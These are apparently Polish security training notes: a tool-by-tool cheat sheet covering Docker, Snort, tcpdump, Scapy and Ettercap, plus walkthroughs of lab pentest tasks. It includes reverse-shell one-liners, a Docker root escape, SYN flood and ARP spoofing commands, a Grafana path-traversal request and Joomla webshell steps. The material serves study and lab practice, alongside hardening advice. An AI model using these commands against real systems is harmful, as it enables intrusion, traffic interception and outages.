docker -H <host>:2375 version
# 5. Szybka eskalacja do roota w kontenerze:
docker run -it -v /:/host/ ubuntu:latest chroot /host/ bash
# 6. Kontener uruchomiony z flagą --privileged jako root?
ls /dev   # jeśli widoczne są wszystkie urządzenia, to bingo:
mkdir /tmp/dysk
mount /dev/sda /tmp/dysk
cd /tmp/dysk
ls        # jesteśmy w /root na hoście
# 7. Połączenie technik: a) low-priv user na hoście z dostępem do docker, b) uruchamiamy kontener z --privileged:
docker run --privileged -it -v /:/host/ ubuntu:latest chroot /host/ bash
docker ps                       # szukamy id/nazwy kontenera
docker exec -it <id kontenera> /bin/bash
mkdir /tmp/dysk
mount /dev/sda /tmp/dysk
cd /tmp/dysk
ls
```
Zabezpieczenie kontenerów:
```bash
# Nie używaj flagi --privileged! Jeśli potrzebny dostęp do urządzenia z hosta:
docker run --device=/dev/sda:/dev/xvdc --rm -it ubuntu fdisk /dev/xvdc
# Usługa na porcie < 1024:
docker run -it --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE php:apache
# Nie pozwalaj logować się jako root:
docker run -u 1001 -it ubuntu:latest /bin/bash
# Wyłączenie możliwości zostania rootem:
docker container run --rm -it --user 1001:1001 --security-opt no-new-privileges mycontainer
```
* Docker rootless mode: https://docs.docker.com/engine/security/rootless/
* Inspekcja instalacji Docker: https://github.com/docker/docker-bench-security (`./docker-bench-security.sh`)

Skanowanie obrazów kontenerem Clair:
```bash
# https://github.com/quay/clair
docker run --rm -v /root/clair_config/:/config -p 6060-6061:6060-6061 -d clair -config="/config/config.yaml"
clair-scanner -c http://172.17.0.3:6060 --ip 172.17.0.1 ubuntu-image
```
* Monitorowanie Dockera z użyciem auditd: https://sekurak.pl/monitoring-bezpieczenstwa-linux-integracja-auditd-ossec-czesc-i/

## Trivy

# Oprogramowanie antywirusowe

**Analiza statyczna** — weryfikacja sygnatur pobranego pliku. Pozwala wykryć znane złośliwe oprogramowanie (domeny, ciągi znaków, sumy kontrolne plików, adresy IP itd.). Nowsza odmiana to klasyfikacja plików oparta na uczeniu maszynowym oraz weryfikacja w statycznej bazie malware.

**Analiza dynamiczna** — nowoczesny antywirus, oprócz analizy statycznej, sprawdza zachowanie pobranego oprogramowania. Program uruchamiany jest w tzw. sandboksie (emulatorze środowiska wykonawczego), gdzie obserwowane jest jego zachowanie (próby odszyfrowania i odczytania haseł przeglądarki, zrzut LSASS itp.). Sandbox może działać lokalnie lub w chmurze. Ciekawostka: hostname maszyny sandbox w Windows Defenderze to zawsze „HAL9TH".

**Analiza behawioralna** — systemy EDR wykorzystują analizę behawioralną w celu wykrycia podejrzanego zachowania uruchamianej aplikacji. Przykład: czy aplikacja nie wywołuje w bardzo krótkim odstępie czasu komendy `whoami` i innych podejrzanych?

# Ataki DDoS

* Ataki DDoS mogą być **wolumetryczne** — atak na warstwę 4 (mierzymy w Mb/s).
* Ataki DDoS mogą być **aplikacyjne** — atak w warstwie 7 (zajmujemy wszystkie sockety aplikacji).
* W warstwie 7 jest też atak **packet-per-second / HTTP Flood** — mierzony liczbą żądań na sekundę (rps), obciąża CPU.
* Aby się bronić, trzeba odpowiednio skonfigurować serwer HTTP / load balancer.
* https://github.com/shekyan/slowhttptest
* Snort / Suricata (mogą alertować, dropować i wiele więcej).

# Systemy IDS/IPS

## Snort

* http://manual-snort-org.s3-website-us-east-1.amazonaws.com/

Bardzo długo i aktywnie rozwijany system klasy IDS. Może też pracować w trybie IPS (w przypadku wykrycia ataku może poprosić firewall o zablokowanie atakującego). Open Source, często stosowany przez producentów sprzętu.

Konfiguracja:
```bash
/etc/snort/snort.conf
/etc/snort/snort.debian.conf   # ustawienia debianowe
# - wyłączenie dynamic detection (dynamic rules libraries)
# - ustawienie RULE_PATH
# - włączenie odpowiednich reguł
# przykładowa reguła: /etc/snort/rules/local.rules
```
Składnia reguł:
```bash
alert (proto) (srcIP) (srcPort) -> (dstIP) (dstPort) (…)
alert ip any any -> any any (msg:"testowa reguła"; sid:1000001;)
alert ip any any -> any any (msg:"Testowa reguła"; content:"straszny_atak"; nocase; sid:1000001;)
```
Analiza PCAP:
```bash
snort -r plik.pcap -l /root/snort_logs -c /etc/snort/snort.conf
```
* https://litux.nl/mirror/snortids/0596006616/snortids-CHP-5-SECT-2.html

Output plugins — sposób logowania (np. do pliku tekstowego, logowanie unified — minimalizacja obciążenia Snorta).
Reguły:
* community rules (dostępne np. w dystrybucjach)
* komercyjne — https://www.proofpoint.com/
* „oficjalne" reguły VRT

Protokoły do wyboru: `tcp`, `udp`, `icmp`, `ip`.

Przykładowe reguły i uruchomienia:
```bash
# Reguła w /etc/snort/snort.conf do przechwytywania ICMP:
alert icmp any any -> any any (msg:"zadanie 1 - icmp 8,0"; itype:8; icode:0; sid:6666666;)
snort -K none -A console -v -c /etc/snort/snort.conf -i ens4

alert icmp any any -> any any (msg:"zadanie 2 - SEKuRAK detected"; itype:8; content:"SEKuRAK"; sid:6666667;)
snort -K none -A console -c /etc/snort/snort.conf -i ens4

alert icmp any any -> any any (msg:"zadanie 2 - SEKuRAK detected"; itype:8; icode:0; content:"SEKuRAK"; sid:6666667;)
snort -K none -A console -q -c /etc/snort/snort.conf -i ens4

# Reguła z progiem (threshold) — alert po 5 wystąpieniach w 60 s:
alert icmp any any -> any any (msg:"zadanie 3"; itype:13; icode:0; content:"sekUrak"; sid:6666668; threshold: type threshold, track by_src, count 5, seconds 60;)
snort -K none -A console -q -c /etc/snort/snort.conf -i ens4

# detection_filter — info o każdym takim pakiecie po wystąpieniu:
alert icmp any any -> any any (msg:"seKurak + timestamp - icmp 13,0 - 5 occurrences"; itype:13; icode:0; content:"sekUrak"; sid:1000007; threshold: type threshold, track by_src, count 5, seconds 60;)
snort -K none -A console -q -c /etc/snort/snort.conf -i ens4
```

## ModSecurity

## Wazuh

# Reverse engineering i analiza malware

## Cheat Engine

## Ghidra

## x64dbg

## HxD

## Cutter

## ReClass.NET

## API Monitor

## Crackmes

## IDA Pro

## Radare2

## Binary Ninja

## PEStudio

## YARA

## Cuckoo Sandbox

## ANY.RUN

## Hybrid Analysis

## VirusTotal

# Informatyka śledcza i reagowanie na incydenty

## Autopsy

## Volatility

## Sleuth Kit

## FTK Imager

# Łamanie haseł i hashowanie

## John the Ripper

## Hashcat

https://hashcat.net/wiki/doku.php?id=example_hashes

## Hydra

# Phishing

* https://openphish.com/
* https://www.phishtank.com/

# Bezpieczeństwo sieci i analiza ruchu

## Wireshark

## Tshark

Przechwytuje i wyświetla szczegółowe informacje o pojedynczym pakiecie na interfejsie eth0. Tshark to konsolowa wersja Wiresharka — przydatna do szczegółowej analizy pakietów w terminalu.
```bash
tshark -V -c 1 -i eth0
```
Filtruje i przechwytuje żądania HTTP GET na interfejsie eth0. Przydatne do analizy ruchu webowego i wykrywania podejrzanych żądań.
```bash
tshark -Y 'http.request.method == "GET"' -i eth0
```
Analizuje plik pcap (`capture.pcap`) i podsumowuje statystyki endpointów IP — wzorce komunikacji, próby eksfiltracji danych, skany sieci.
```bash
tshark -r capture.pcap -qz endpoints,ip
```
Śledzi strumień pierwszej konwersacji TCP w pliku pcap w ASCII — pomaga zrekonstruować zawartość sesji lub wykryć złośliwą komunikację.
```bash
tshark -r capture.pcap -q -z follow,tcp,ascii,0
```
Wydobywa źródłowe IP, docelowe IP i informacje o protokole z pakietów w pliku pcap, w formacie pól. Przydatne do szybkiego parsowania konkretnych szczegółów ruchu.
```bash
tshark -e ip.src -e ip.dst -e frame.protocols -T fields -r capture.pcap
```

## ngrep

## fragroute

## ProxyChains

Przekierowanie ruchu sieciowego do wewnętrznej sieci:
```bash
nano /etc/proxychains5.conf
# Na końcu pliku dodać:
#   socks5  127.0.0.1 1080
# Zestawienie dynamicznego tunelu SSH (proxy SOCKS na lokalnym porcie 1080):
ssh -D 1080 <user>@<serwer>
# Teraz można przesyłać ruch większości narzędzi z lokalnej VM Kali do wewnętrznej sieci LAN:
proxychains nmap 10.10.0.0/24
```
Konfiguracja krok po kroku:
1. Edycja `/etc/proxychains4.conf` — na końcu pliku podmienić `socks4 127.0.0.1 9050` na `socks5 127.0.0.1 1080`.
2. Zestawienie dynamicznego tunelu SSH z poziomu VM Kali — `ssh -D 1080 labuser1@lab.securitum.space`
3. Skan sieci 10.10.0.0/24 przez proxychains — `proxychains nmap -Pn -sT 10.10.0.0/24 -oX nmap_sn_101000.xml`

## SSLStrip

## iperf

## ike-scan

## ThreatCheck

## tcpreplay

## NetworkMiner

## Netcat

netcat (bind shell) — serwer nasłuchujący stawiamy na maszynie ofiary.
netcat (reverse shell) — serwer nasłuchujący stawiamy na maszynie atakującego.

Reverse shell:
```bash
# Na maszynie atakującego:
nc -lvnp 4444
# Na maszynie ofiary:
bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
```
`nc -e /bin/sh <attacker_ip> 1234` — nawiązuje reverse shell z celu do maszyny atakującego na porcie 1234, uruchamiając `/bin/sh`. `nc -lvp 1234` — nasłuchuje na porcie 1234, zwykle po stronie atakującego, by odebrać reverse shell (`l` = listen, `v` = verbose, `p` = port).

Prosty czat:
```bash
nc -lvp 1234              # listener (prosty serwer czatu)
nc -v <ipaddress> 1234    # klient łączący się z serwerem czatu
```

## Snorby

## tcpxtract

## hping3

Program umożliwiający generowanie różnego rodzaju pakietów. hping3 potrafi spoofować adresy źródłowe (`--rand-source`), wysyłając każdy pakiet z innego IP — utrudnia to obronę.

Wysyła pakiety SYN do portu 80 z dużą prędkością (`--flood`), symulując atak SYN flood (`-S` = flaga SYN, `-V` = verbose, `-p 80` = port docelowy). Służy do testowania odporności celu na SYN flood.
```bash
hping3 -S --flood -V -p 80 172.18.0.11
```
Wykonuje traceroute do example.com pakietami ICMP (`-1`), w trybie verbose. Mapuje trasę pakietów do celu, pomaga zidentyfikować firewalle, routery i inne urządzenia.
```bash
hping3 --traceroute -V -1 example.com
```
Generowanie pakietów UDP i fragmentacja:
```bash
hping3 --udp -p 19 10.0.0.11
hping3 -S -V -p 80 -d 1000 -c 5 --rand-source ships.securitum.space
# MTU określa maksymalny rozmiar pakietu; duży pakiet można pofragmentować na mniejsze (-f):
hping3 -S -V -p 80 -d 1000 -c 5 --rand-source ships.securitum.space -f
```

## tcpdump

Przechwytuje pakiety ICMP ze wszystkich interfejsów. Przydatne do monitorowania ruchu ICMP pod kątem podejrzanych działań (ping sweep, mapowanie sieci).
```bash
tcpdump -i any icmp
```
Przechwytuje ruch na interfejsie eth0 i zapisuje go do pliku `capture.pcap`. Podstawowa technika przechwytywania i analizy pakietów.
```bash
tcpdump -w capture.pcap -i eth0
```
Odczytuje pakiety z pliku pcap, umożliwiając analizę offline przechwyconego ruchu.
```bash
tcpdump -r capture_file.pcap
```
Przechwytuje pierwsze 100 pakietów na eth0 — ogranicza przechwytywanie do zarządzalnej liczby pakietów (szybka analiza lub demonstracja).
```bash
tcpdump -i eth0 -c 100
```
Kolejne przykłady:
```bash
tcpdump -i ens4 -n -A -vv
tcpdump -i ens4 host 10.0.0.11 and port 520
tcpdump -i ens4 host 10.0.0.11 and "port 520 or port 22"
tcpdump -i ens4 tcp and host 10.0.0.11
tcpdump -i ens4 tcp and host 10.0.0.11 -w pcap.pcap
tcpdump -i ens4 tcp and host 10.0.0.11 -w pcap.pcap -c 10
tcpdump -n -i ens1 -w zrzut.pcap -c 10 tcp and port 80   # potem można wyświetlić w scapy lub Wireshark
```
Przydatne flagi:
* `-n` — wyłączenie odpytywania DNS (bez tego tcpdump często wygląda, jakby się „zawiesił")
* `-i <interfejs>` — nasłuch na konkretnym interfejsie (większa dokładność)
* `-c N` — odczytanie N pakietów
* `-w plik.pcap` — zapis pakietów do pliku
* `-r plik.pcap` — odczyt i wyświetlenie pakietów z pliku
* `-vv` — bardziej szczegółowa prezentacja pakietów
* `-X` / `-XX` — wyświetlenie szczegółów również w formie zrzutu HEX
* `-e` — wyświetlenie adresacji fizycznej (adresy MAC)

Filtry BPF:
```bash
host 192.168.1.1
dst host 192.168.1.1
port 80
arp
tcp
icmp
ip
# Filtry można łączyć:
host 192.168.1.1 and dst port 25
# Warunki logiczne:
tcp and (port 80 or port 25)
```

## Ettercap

Ettercap to „kombajn" do ataków klasy MITM (man-in-the-middle). Istnieje jego ulepszona wersja — bettercap.

ARP Poison Routing (APR):
```bash
# ARP Spoofing:
ettercap -Tq -M arp:remote /192.168.0.113,147,156/
# Sniffing:
tcpdump -i eth1 -w /var/www/dump_voip.pcap
# Odsłuch: Wireshark
```
Budujemy pakiet od nowa (na bazie tego, co przechwyciliśmy) lub modyfikujemy przechwycony.
```bash
# ARP:
ettercap -i ens4 -Tq -M arp:remote /10.0.0.11// /10.0.0.12//

# Rogue DHCP — uruchamia serwer DHCP z pulą 10.20.0.30-40, maską /24 i DNS-em 10.20.0.18:
ettercap -Tq -M dhcp:10.20.0.30-40/255.255.255.0/10.20.0.18
# Aby uruchomić fake DNS w Ettercap, wciskamy P i wpisujemy dns_spoof.
```

## Bettercap

## Scapy

* https://securityonionsolutions.com/software
* https://sekurak.pl/generator-pakietow-scapy/
* https://sekurak.pl/generator-pakietow-scapy-czesc-2/
* https://scapy.readthedocs.io/en/latest/usage.html#tcp-port-scanning

Scapy to generator i sniffer pakietów, kompatybilny z libpcap. Umożliwia generowanie pakietów, analizę komunikacji (porównywalne z tekstowym Wiresharkiem — Tshark), zmianę i ponowne wysłanie komunikacji oraz bogate skryptowanie w Pythonie (dynamiczna reakcja na zdarzenia w sieci).

Pomoc i introspekcja:
```python
ls()              # obsługiwane pakiety/protokoły
ls(nazwa_pakietu) # szczegółowe informacje o pakiecie
ls(ICMP)          # np. ICMP
lsc()             # funkcje dostępne w Scapy
help(sniff)
```
Generowanie i wysłanie pakietu:
```python
pakiet = IP(dst='192.168.0.1')/ICMP()
pakiet.show()              # wyświetlenie pakietu
odpowiedz = sr1(pakiet)    # wysłanie i odbiór odpowiedzi
odpowiedz.show()
```
Wysłanie wielu pakietów:
```python
pakiety = IP(dst='10.0.1.254')/ICMP(type=(0,20))
odp, nodp = sr(pakiety, timeout=2)
odp.show()
odp[1][1].show()

pakiety = IP(dst='10.0.1.254')/TCP(dport=(20,100))
odp, nodp = sr(pakiety)
for p in odp:
    if p[1].sprintf('%TCP.flags%') == 'SA':
        print(p[0].dport)
```
Skanowanie portów TCP:
```python
res, unans = sr(IP(dst="10.0.0.11")/TCP(flags="S", dport=(1,100)), timeout=10)
for snd, rcv in res:
    if rcv[TCP].flags == "SA":
        print(f"Otwarty port: {snd[TCP].dport}")
```
Sniffing ARP:
```python
def process_arp(packet):
    if packet.haslayer(ARP):
        print(f"{packet[ARP].psrc} pyta gdzie jest {packet[ARP].pdst}")
        packet.show()

sniff(filter="arp", prn=process_arp, store=0, iface="ens4")
```
ARP spoofing:
```python
target_ip = "10.0.0.11"
spoof_ip = "10.0.0.13"
moj_mac = "fa:16:3e:60:9c:7d"
target_mac = getmacbyip(target_ip)
if target_mac is None:
    print(f"Brak {target_ip}.")
else:
    while True:
        arp_response = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac, hwsrc=moj_mac)
        send(arp_response, iface="ens4")
        print(f"FAKE!: {spoof_ip} jest tu --> {moj_mac}, wysłane do {target_ip} ({target_mac})")
        time.sleep(0.1)
```
Praca z plikiem pcap:
```python
pakiet = rdpcap('www_request.pcap')
hexdump(pakiet[3])
pakiet[3].show()
pakiet[3].pdfdump("/var/www/1.pdf", layer_shift=1)
```
Modyfikacja przechwyconego pakietu ARP i ponowne wysłanie:
```python
pakiety_arp = sniff(filter="arp", count=1, iface="ens4")
pakiety_arp.show()
pakiety_arp[0].show()
pakiety_arp[0].op = 'is-at'
pakiety_arp[0].hwsrc = '<moj-mac>'
pakiety_arp[0].hwdst = '<adres-mac-ofiary>'
pakiety_arp[0].pdst = '<adres-ip-ofiary>'
# Adres MAC ofiary można poznać funkcją getmacbyip():
getmacbyip('10.50.0.17')
pakiety_arp[0].psrc = '10.0.0.12'
sendp(pakiety_arp[0], iface="ens4")
# tcpdump -i ens4 -n icmp -> powinny być tam pingi z 10.0.0.11 na 10.0.0.12
```

# Narzędzia developerskie i produktywność

## Visual Studio Code

## Tmux

Terminal multiplexer pozwalający na obsługę wielu sesji terminala w jednym oknie. Przydatny do zarządzania wieloma zadaniami wiersza poleceń podczas testów.
```bash
tmux              # uruchomienie
tmux new -s bob   # nowa sesja o nazwie "bob"
tmux a            # podłączenie do ostatniej sesji
```
Prefix ustawiony na `C-a` (CTRL+a), więc komendy są zbliżone do tych ze `screen`:
```bash
CTRL+a c        # otwarcie nowego okna (tab)
CTRL+a %        # podzielenie okna w pionie
CTRL+a "        # podzielenie okna w poziomie
CTRL+a <strzałka>  # przechodzenie między podziałami
CTRL+a n        # następne okno
CTRL+a p        # poprzednie okno
CTRL+a <numer>  # przejście do konkretnego okna
CTRL+a d        # zminimalizowanie (detach) sesji
CTRL+a [        # copy mode — przewijanie ekranu (wyjście: q)
CTRL+a z        # zoom (powrót tak samo)
```

## Arduino IDE

## DB Browser (SQLite)

## draw.io

## MobaXterm

## WinMerge

## 7-Zip

# Narzędzia sprzętowe

* https://pwnagotchi.ai/
* https://www.mobile-hacker.com/2024/03/26/blueducky-automates-exploitation-of-bluetooth-pairing-vulnerability-that-leads-to-0-click-code-execution/

# Źródła wiedzy i newsy

* https://attack.mitre.org/
* https://owasp.org/www-project-top-ten/
* https://www.cisecurity.org/cis-benchmarks
* https://www.cvedetails.com/
* https://news.ycombinator.com/

# Przykładowe testy penetracyjne

Źródło publicznych raportów: https://www.securitum.com/public-reports.html

### Przykład 1
* `nmap 178.79.162.77 -Pn` → w wyniku: `8000/tcp open http-alt`
* `ffuf -w common.txt -u http://178.79.162.77:8000/FUZZ`
* Adres `http://178.79.162.77:8000/old_site`
* Plik `http://178.79.162.77:8000/old_site/file.txt`

### Przykład 2
* `nmap -Pn -p- 10.10.10.50` → port 3000/TCP otwarty; baner wskazuje serwer HTTP.
* Otworzyć adres w przeglądarce — w tym celu zestawić SOCKS proxy z hosta do serwera CTF (`ssh root@ctf.securitum.space -D9999`) i skonfigurować Burpa (Settings → SOCKS Proxy).
* Identyfikacja podatnej usługi — Grafana, CVE-2021-43798 (path traversal, odczyt dowolnego pliku). W Burp Suite przesłać żądanie:
  * `GET /public/plugins/alertlist/../../../../../../../../../../../../..//home/grafana/challenge/flag.txt HTTP/1.1`

### Przykład 3
* `nmap -Pn -p- 10.10.10.99` → port 9000/TCP otwarty; baner wskazuje serwer HTTP.
* Otworzyć adres w przeglądarce przez SOCKS proxy (`ssh root@178.79.162.77 -D9999`) i Burpa.
* Identyfikacja podatnej usługi — MinIO, CVE-2023-28432 (ujawnienie wszystkich zmiennych środowiskowych, w tym danych logowania do panelu admina). W Burp Suite przesłać żądanie:
  * `POST /minio/bootstrap/v1/verify HTTP/1.1`

### Przykład 4
* `nmap -Pn -p- 10.10.10.22` → port 80/TCP otwarty; baner wskazuje serwer HTTP.
* Otworzyć adres przez SOCKS proxy (`ssh root@178.79.162.77 -D9999`) i Burpa.
* Identyfikacja podatnej usługi — Joomla. Możliwe zalogowanie do panelu admina (`http://10.10.10.22/administrator`) domyślnymi danymi `admin:admin`.
* Zdalne wykonanie kodu przez modyfikację treści strony:
  1. Zedytować domyślny szablon Joomla — Cassiopeia (System → Site Templates → Cassiopeia Details and Files → `/templates/cassiopeia/index.php`).
  2. Dodać na końcu kodu szablonu złośliwy kod PHP (webshell).
  3. Przesłać żądanie GET do strony głównej z parametrem `cmd` zawierającym komendę.
* Flaga w `/tmp/challenge/flag.txt`:
  * `GET /?cmd=cat%20/tmp/challenge/flag.txt HTTP/1.1`

### Przykład 5
* `nmap -Pn -p- 10.10.10.18` → port 8080/TCP otwarty; baner wskazuje serwer HTTP.
* W przeglądarce brak konkretnej informacji — komunikat błędu (Whitelabel Error Page) wskazuje na Spring Boot (Java).
* Identyfikacja podatnej usługi — Log4j. Problem z eksploitacją wynika z braku prostego dostępu do środowiska Java (konta uczestników CTF mają niskie uprawnienia). Java jest konieczna do uruchomienia złośliwego serwera JNDI zwracającego odpowiednio sformatowaną odpowiedź LDAP.

### Przykład 6
* `nmap -Pn -p- 10.10.10.49` → port 6379/TCP otwarty; baner wskazuje usługę Redis.
* Identyfikacja podatnej usługi — Redis, CVE-2022-0543. Po połączeniu (`redis-cli -h 10.10.10.49 -p 6379` lub `nc -nv 10.10.10.49 6379`) możliwe jest wykonywanie komend Redis bez uwierzytelnienia. Komenda `info` ujawnia, że Redis działa na Ubuntu. Flaga w `/root/challenge/flag.txt`.

### Przykład 7
* `nmap -Pn -p- 10.10.10.6`
* `nmap -Pn 10.10.10.6 -O` → host to Ubuntu; otwarty port 22/TCP (SSH).
* W zadaniu „99" (web — MinIO) dane logowania do panelu to `ubuntulab:ubuntuadmin`. Należy wykorzystać je do zalogowania się via SSH. Błąd polega na ponownym użyciu tych samych poświadczeń do wielu usług — typowa zła praktyka w realnych środowiskach.

### Przykład 8
* `nmap -Pn -p- 10.10.10.57`
* `nmap -Pn 10.10.10.57 -O` → host to Ubuntu; otwarty port 22/TCP (SSH).
* Zalogowanie się przez SSH danymi uzyskanymi w innym zadaniu.
* Użytkownik root ma dostęp do narzędzia `mount`:
  ```
  overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/...)
  ```
* W przeciwieństwie do pozostałych maszyn, po uzyskaniu roota na .57 widać zawartość `/dev`:
  ```
  ls /dev
  [...] sda snd tty1 ... watchdog
  ```
  co potwierdza, że kontener uruchomiono z flagą `--privileged`.
* Można podmontować dysk główny hosta do dowolnego folderu:
  ```bash
  mkdir /tmp/dysk
  mount /dev/sda /tmp/dysk
  cd /tmp/dysk/
  ```

# TODO: do nauki / przeczytania

Komendy do sprawdzenia:
```bash
systemd-analyze
w
getsebool -a
aureport
ausearch --message USER_LOGIN --success no --interpret
cat /proc/mdstat
systemctl --type=service
systemctl is-active [...]
systemctl is-enabled [...]
cat /etc/default/grub
ulimit -a
```

Narzędzie OpenSCAP (`oscap`):
```bash
yum install -y httpd openscap-scanner scap-security-guide
oscap info /usr/share/xml/scap/ssg/content/ssg-ol9-ds.xml
oscap info --fetch-remote-resources --profile xccdf_org.ssgproject.content_profile_pci-dss /usr/share/xml/scap/ssg/content/ssg-ol9-ds.xml
oscap xccdf eval --fetch-remote-resources --profile xccdf_org.ssgproject.content_profile_pci-dss --results ./scan-xccdf-results.xml /usr/share/xml/scap/ssg/content/ssg-ol9-ds.xml
date=$(date +"%Y%m%d")
oscap xccdf generate report ./scan-xccdf-results.xml > ./"$date"_oscap_report.html
oscap xccdf eval --profile xccdf_org.ssgproject.content_profile_pci-dss --remediate --fetch-remote-resources --results ./scan-xccdf-results.xml --rule xccdf_org.ssgproject.content_rule_package_libreswan_installed /usr/share/xml/scap/ssg/content/ssg-ol9-ds.xml
```

Lynis:
```bash
wget https://downloads.cisofy.com/lynis/lynis-3.1.1.tar.gz
tar xvf lynis-3.1.1.tar.gz
sudo chown -R 0:0 lynis
date=$(date +"%Y%m%d")
cd lynis
sudo ./lynis audit system | ansi2html -la > ./../output/"$date"_lynis_report.html
cd ..
rm -rf ./lynis*
```

Trivy (skan wszystkich lokalnych obrazów Docker):
```bash
#!/bin/bash
rm -rf ./output/*
rm -rf ./cache/*
date=$(date +"%Y%m%d")

# Wszystkie unikalne nazwy obrazów (repozytoria) i ich tagi:
images=$(docker images --format "{{.Repository}}:{{.Tag}}" | sort | uniq)

for image in $images
do
  image_name="${image%:*}"
  image_tag="${image##*:}"
  last_name="${image_name##*/}"

  # Pomiń sam obraz trivy:
  if [ "$last_name" == "trivy" ]; then
    continue
  fi

  # Potrzebny plik html.tpl:
  docker run --name trivy --rm --network host -v ./html.tpl:/root/html.tpl -v ./output:/root/output -v ./cache:/root/.cache/ -v /var/run/docker.sock:/var/run/docker.sock docker.io/aquasec/trivy:latest image --format template --template "@/root/html.tpl" -o /root/output/"$date"_trivy_report_"$last_name".html "$image_name":"$image_tag"
done

docker image rm aquasec/trivy:latest
```

Linki i zasoby do przejrzenia:
* https://www.rtl-sdr.com/
* https://airspy.com/download/
* https://bruce.computer/
* https://www.openvas.org/
* https://docs.tenable.com/nessus/Content/InstallNessusLinux.htm
* https://sekurak.pl/wprowadzenie-do-sysinternals-suite/
* https://github.com/pentestfunctions/BlueDucky
* https://learn.microsoft.com/pl-pl/sysinternals/downloads/
* https://dhiyaneshgeek.github.io/red/teaming/2022/04/28/reconnaissance-red-teaming/
* https://github.com/skylot/jadx
* https://www.thewindowsclub.com/enable-or-disable-run-command-winr-box-in-windows-10
* https://any.run/
* https://www.splunk.com/en_us/blog/security/powershell-web-access-your-network-s-backdoor-in-plain-sight.html
* https://lolbas-project.github.io/
* https://book.hacktricks.wiki/en/index.html
* https://gamehacking.gg/
* https://www.forensicosint.com/
* https://hijacklibs.net/
* https://github.com/ohyicong/decrypt-chrome-passwords
* https://cyscan.io/
* https://github.com/RUB-NDS/PRET — narzędzie, które czasem pozwala wyjść z shella drukarki do shella Linuksa w drukarce
* https://roadmap.sh/
* https://www.hackthebox.com/
* https://phonebook.cz/ — informacje o domenach, mailach i URL
* https://engineering.salesforce.com/easily-identify-malicious-servers-on-the-internet-with-jarm-e095edac525a/
* https://github.com/cedowens/C2-JARM
* https://www.suncalc.org/
* https://www.freeradius.org/
* https://www.cloudflare.com/pl-pl/learning/access-management/what-is-mutual-tls/
* http://www.vulnerabilityassessment.co.uk/Penetration%20Test.html
* https://www.dualcomm.com/products/usb-powered-10-100-1000base-t-network-tap
* https://builtwith.com/
* https://gpsjam.org/
* https://telehack.com/
* https://wigle.net/
* https://whois.domaintools.com/
* https://www.iplocation.net/
* https://eternallybored.org/
* https://www.threatminer.org/
* https://amiunique.org/
* https://sekurak.pl/hostowe-systemy-wykrywania-intruzow-hids/
* https://cert.pl/posts/2016/09/necurs-hybrydowy-botnet-spamowy/
* https://visualping.io/
* https://tineye.com/
* https://www.geoportal.gov.pl/
* https://pastebin.com/
* https://intelx.io/
* https://rejestr.io/
* https://romek.info/ut/urzskarb.php
* https://www.cgsecurity.org/
* https://www.ssllabs.com/ssltest
* https://workbook.securityboat.net/
* https://kompose.io/
* https://computingforgeeks.com/how-to-provision-vms-on-kvm-with-terraform/
* https://command-not-found.com/
* https://www.exploit-db.com/
* https://github.com/telekom-security/tpotce
* https://github.com/tats/w3m
* https://github.com/browsh-org/browsh
* https://ssl-config.mozilla.org/
* https://caniuse.com/
* https://weleakinfo.io/
* https://www.sonarsource.com/lp/knowledge/languages/
* https://pswalia2u.medium.com/ssh-tunneling-port-forwarding-pivoting-socks-proxy-85fb7129912d
* https://github.com/twelvesec/port-forwarding
* https://github.com/The-Z-Labs/linux-exploit-suggester
* https://sekurak.pl/monitoring-bezpieczenstwa-linux-integracja-auditd-ossec-czesc-i/
* https://sekurak.pl/chroot-w-praktyce/
* https://wave.webaim.org/extension/
* https://www.first.org/cvss/calculator/3.0
* https://github.com/streaak/keyhacks
* https://publicwww.com/
* https://github.com/ptoomey3/evilarc
* https://github.com/shieldfy/API-Security-Checklist
* https://github.com/sensepost/objection
* https://github.com/SwiftOnSecurity/sysmon-config
* https://canarytokens.org/nest/
* https://www.ventoy.net/en/index.html
* https://argfuscator.net/
* https://www.atomicredteam.io/atomic-red-team
* https://github.com/center-for-threat-informed-defense/adversary_emulation_library
* https://sekurak.pl/wprowadzenie-do-sysinternals-pstools-psexec/
* https://github.com/topics/cybersecurity-projects
* https://github.com/topics/cybersecurity
* https://www.nitttrchd.ac.in/imee/Labmanuals/Password%20Cracking%20of%20Windows%20Operating%20System.pdf

Pozostałe notatki:
* Konfiguracja SSH na Linux: `X11Forwarding no`, `AllowTcpForwarding no`
* Adres MAC `AA:BB:CC:DD:EE:FF` — pierwsze 3 oktety mówią o producencie, kolejne to identyfikator urządzenia
* Przydatne komendy `curl`:
  ```bash
  curl --head --location "https://ntck.co/itprotv"
  curl -IsL http://networkchuck.com/ | findstr ^Location
  curl checkip.amazonaws.com
  curl qrenco.de/https://networkchuck.coffee
  curl wttr.in/location
  ```
* Tunel SSH z kluczem: `ssh root@145.239.135.237 -i $HOME/.ssh/securitum-szkolenie -D 8845`
* Google dorki: `site:gov.pl "mysql warning:"`, `site:gov.pl "Index of"`
* Przeglądarki tekstowe: Lynx
